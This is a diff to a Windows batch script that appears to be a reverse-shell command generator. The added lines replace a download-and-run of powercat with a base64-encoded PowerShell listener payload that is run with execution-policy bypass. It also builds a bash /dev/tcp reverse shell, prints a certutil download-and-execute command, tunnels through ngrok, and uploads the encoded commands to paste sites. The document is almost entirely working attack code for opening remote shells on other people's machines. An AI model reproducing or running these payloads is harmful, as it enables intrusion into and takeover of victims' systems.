@@ -191,14 +191,17 @@ if "%~1" equ "" (
 
             ) else (
                 if not "%2"=="-ngrok" (
+                    echo ok
                     if not "%2"=="-pgrok" (
                         if "!rs_os_flag!"=="W10" (
+                            call :rs_banner_w10_start
                             echo  + Host:Port ^<==^> %~1:%~2
                             call :rs_info_w10windows_start
                             call :rs_windows_command_raw_start %~1 %~2
                             call :rs_info_w10linux_start
                             call :rs_linux_command_raw_start %~1 %~2
                         ) else (
+                            call :rs_banner_w7_start
                             echo  + Host:Port ^<==^> %~1:%~2
                             call :rs_info_w7windows_start
                             call :rs_windows_command_raw_start %~1 %~2
@@ -277,6 +280,7 @@ for /f %%i in ('findstr /b /c:"-" /v "%temp%\rs_temp_output.rsg"') do (
 :rs_clean_tempfile_start
 if exist "%temp%\rs_temp_input.rsg" del /q %temp%\rs_temp_input.rsg
 if exist "%temp%\rs_temp_output.rsg" del /q %temp%\rs_temp_output.rsg
+if exist "%temp%\powershell_listener.tmp" del /q %temp%\powershell_listener.tmp
 goto :eof
 :rs_clean_tempfile_end
 
@@ -291,7 +295,6 @@ if exist "%cd%\include\pcat.ps1" (
     powershell -c write-host "' - Unable to start listening,Missing file %cd%\include\pcat.ps1.'" -f red -n 2>nul
     goto rs_help_start
 )
-
 goto :eof
 :rs_local_listen_end
 
@@ -305,14 +308,14 @@ if exist "%cd%\include\ngrok.exe" (
     set rs_n=0
     FOR /L %%i in (1,1,30) do (
         set /a rs_n=!rs_n!+1
-        %cd%\include\curl.exe -s --retry 3 --retry-delay 5 --retry-connrefused http://localhost:4040/api/tunnels|find /i "ngrok.io" >nul&&set rs_ngrok=0
+        %cd%\include\curl.exe -s --retry 3 --retry-delay 5 --retry-connrefused http://localhost:44480/api/tunnels|find /i "ngrok.io" >nul&&set rs_ngrok=0
         if !rs_ngrok! == 0 goto :rs_ngrok_host
     )
 
     :rs_ngrok_host
     if !rs_ngrok! == 0 (    
-        FOR /F "tokens=9 delims==://" %%i in ('%cd%\include\curl.exe -s --retry 3 --retry-delay 5 --retry-connrefused http://localhost:4040/api/tunnels') do (set rs_ngrok_host=%%i)
-        FOR /F tokens^=11^ delims^=^:^,^" %%i in ('%cd%\include\curl.exe -s --retry 3 --retry-delay 5 --retry-connrefused http://localhost:4040/api/tunnels') do (set rs_ngrok_port=%%i)
+        FOR /F "tokens=9 delims==://" %%i in ('%cd%\include\curl.exe -s --retry 3 --retry-delay 5 --retry-connrefused http://localhost:44480/api/tunnels') do (set rs_ngrok_host=%%i)
+        FOR /F tokens^=11^ delims^=^:^,^" %%i in ('%cd%\include\curl.exe -s --retry 3 --retry-delay 5 --retry-connrefused http://localhost:44480/api/tunnels') do (set rs_ngrok_port=%%i)
         
         set rs_listen_host=
         set rs_listen_host=!rs_ngrok_host!
@@ -372,14 +375,32 @@ set rs_listen_host=
 set rs_listen_port=
 set rs_listen_host=%1
 set rs_listen_port=%2
+call :rs_powershell_listener_payload_start !rs_listen_host! !rs_listen_port!
 if "!rs_os_flag!"=="W10" (
-    echo  [92m  powershell -Ep Bypass -NoLogo -NonI -NoP -c IEX^(New-Object System.Net.Webclient^).DownloadString^('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'^);powercat -c !rs_listen_host! -p !rs_listen_port! -e cmd[0m
+    echo  [92m  powershell -EP Bypass -NoLogo -NonI -NoP -Enc !powershell_listener_payload![0m
     echo,
 ) else (
-    echo    powershell -Ep Bypass -NoLogo -NonI -NoP -c IEX^(New-Object System.Net.Webclient^).DownloadString^('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'^);powercat -c !rs_listen_host! -p !rs_listen_port! -e cmd
+    echo    powershell -EP Bypass -NoLogo -NonI -NoP -Enc '!powershell_listener_payload!'
 )
 goto :eof
 :rs_windows_command_raw_end
+
+::rs_powershell_listener_payload_start
+:rs_powershell_listener_payload_start
+set powershell_listener_payload=
+set rs_powershell_listener_payload_pre=
+set rs_powershell_listener_payload_suf=
+set /p rs_powershell_listener_payload_pre=<%cd%\payload\powershell_listener_1.payload
+set /p rs_powershell_listener_payload_suf=<%cd%\payload\powershell_listener_2.payload
+set powershell_listener_payload=!rs_powershell_listener_payload_pre!!rs_listen_host!'',!rs_listen_port!!rs_powershell_listener_payload_suf!
+powershell -c "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('!powershell_listener_payload!'))|out-file -Encoding ascii %temp%\powershell_listener.tmp"
+::echo !powershell_listener_payload!
+::type %temp%\powershell_listener.tmp
+::set /p powershell_listener_payload=<%temp%\powershell_listener.tmp
+for /f "delims= tokens=1,2" %%i in (%temp%\powershell_listener.tmp) do set powershell_listener_payload=%%i
+::echo !powershell_listener_payload!
+goto :eof
+::rs_powershell_listener_payload_end
 
 :rs_linux_command_raw_start
 set rs_listen_host=
@@ -434,17 +455,26 @@ if exist "%cd%\include\mongoose.exe" (
 ) else (
     powershell -c write-host "' - Missing file `"%cd%\include\mongoose.exe`",The web service failed to start`,the LAN mode needs to start the web service locally`,so the command will not be executed effectively'" -f red -n 2>nul
 )
+
+set rs_ps_command_pre_lan=
+set ps_command_suf_raw_lan=
+set linux_command_raw_lan=
+set rs_ps_command_suf_b64_lan=
+set rs_command_b64_lan=
+
+call :rs_powershell_listener_payload_start
+set rs_ps_command_b64=!powershell_listener_payload!
+::echo !rs_ps_command_b64!
+
 set "rs_ps_command_pre_lan=&powershell -EP Bypass -NoLogo -NonI -NoP -Enc "
-set "ps_command_suf_raw_lan=IEX (New-Object System.Net.Webclient).DownloadString(''http://%rs_listen_host%:%rs_webport%/pcat.ps1'');pcat -c !rs_listen_host! -p !rs_listen_port! -e cmd"
 set "linux_command_raw_lan=/bin/bash -i>&/dev/tcp/!rs_listen_host!/!rs_listen_port! 0>&1"
 call :rs_base64_encode_start "!linux_command_raw_lan!"
 set rs_linux_command_b64_lan=%rsgen_b64_res%
-powershell -c "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('%ps_command_suf_raw_lan%'))|out-file -Encoding ascii %temp%\rs_temp_input.rsg"
-set /p rs_ps_command_suf_b64_lan=<%temp%\rs_temp_input.rsg
-set "rs_command_b64_lan=!rs_linux_command_b64_lan!!rs_ps_command_pre_lan!!rs_ps_command_suf_b64_lan!"
+set "rs_command_b64_lan=!rs_linux_command_b64_lan!!rs_ps_command_pre_lan!!rs_ps_command_b64!"
 echo !rs_command_b64_lan!>%cd%\include\www\i
 call :rs_http_post_start "!rs_listen_host!" "%temp%\rs_temp_output.rsg"
 set /p rs_ip2dec=<%temp%\rs_temp_output.rsg
+
 if "!rs_os_flag!"=="W10" (
     if "!rs_webport!" equ "80" (
         set rs_webport_display=
@@ -452,7 +482,7 @@ if "!rs_os_flag!"=="W10" (
         set "rs_webport_display=:%rs_webport%"
     )
     call :rs_info_w10windows_start
-    echo  [92m  powershell -Ep Bypass -NoLogo -NonI -NoP -c IEX^(New-Object System.Net.Webclient^).DownloadString^('http://!rs_listen_host!!rs_webport_display!/pcat.ps1'^);pcat -c !rs_listen_host! -p !rs_listen_port! -e cmd[0m
+    echo  [92m  powershell -EP Bypass -NoLogo -NonI -NoP -Enc !powershell_listener_payload![0m
     echo,
     echo  [92m  certutil -urlcache -split -f http://!rs_listen_host!!rs_webport_display!/i cd.bat^|cd.bat[0m
     echo,
@@ -483,7 +513,7 @@ if "!rs_os_flag!"=="W10" (
         set "rs_webport_display=:%rs_webport%"
     )
     call :rs_info_w7windows_start
-    echo    powershell -Ep Bypass -NoLogo -NonI -NoP -c IEX^(New-Object System.Net.Webclient^).DownloadString^('http://!rs_listen_host!!rs_webport_display!/pcat.ps1'^);pcat -c !rs_listen_host! -p !rs_listen_port! -e cmd
+    echo    powershell -EP Bypass -NoLogo -NonI -NoP -Enc !powershell_listener_payload!
     echo,
     echo    certutil -urlcache -split -f http://!rs_listen_host!!rs_webport_display!/i cd.bat^|cd.bat
     echo,
@@ -587,19 +617,21 @@ goto :eof
 :rs_command_generate_pub_start
 set rs_listen_host=
 set rs_listen_port=
+set rs_ps_command_suf_b64=
+set rs_linux_command_b64=
+set rs_command_b64=
 set rs_listen_host=%1
 set rs_listen_port=%2
 set "rs_ps_command_pre=&powershell -EP Bypass -NoLogo -NonI -NoP -Enc "
-set "ps_command_suf_raw=IEX (New-Object System.Net.Webclient).DownloadString(''https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'');powercat -c !rs_listen_host! -p !rs_listen_port! -e cmd"
+call :rs_powershell_listener_payload_start
 set "linux_command_raw=/bin/bash -i>&/dev/tcp/!rs_listen_host!/!rs_listen_port! 0>&1"
 call :rs_base64_encode_start "!linux_command_raw!"
 set rs_linux_command_b64=%rsgen_b64_res%
 ::echo %rs_linux_command_b64%
-powershell -c "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('%ps_command_suf_raw%'))|out-file -Encoding ascii %temp%\rs_temp_input.rsg"
-set /p rs_ps_command_suf_b64=<%temp%\rs_temp_input.rsg
+set rs_ps_command_suf_b64=!powershell_listener_payload!
 ::echo %rs_ps_command_suf_b64%
 set "rs_command_b64=!rs_linux_command_b64!!rs_ps_command_pre!!rs_ps_command_suf_b64!"
-::echo !rs_command_b64!>%temp%\rs_command_b64.rsg
+::echo !rs_command_b64!
 call :rs_command_upload_start
 if "!rs_pastebin_status!"=="-1" (
     if "!rs_dpaste_status!"=="-1" (
@@ -653,7 +685,9 @@ var xhr = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 var AdoDBObj = new ActiveXObject("ADODB.Stream");
 if (args.Length == 6 ) {
     url = args.Item(1)
-    data = args.Item(2).replace("+", "%2B").replace("&", "%26");
+    data = args.Item(2).replace("+","%2B").replace("&","%26").replace("+","%2B").replace("+","%2B").replace("+","%2B");
+    //WScript.Echo(data)
+    //WScript.Quit(666);
     filename = args.Item(3)
     ip = args.Item(4)
     ipfilename = args.Item(5)
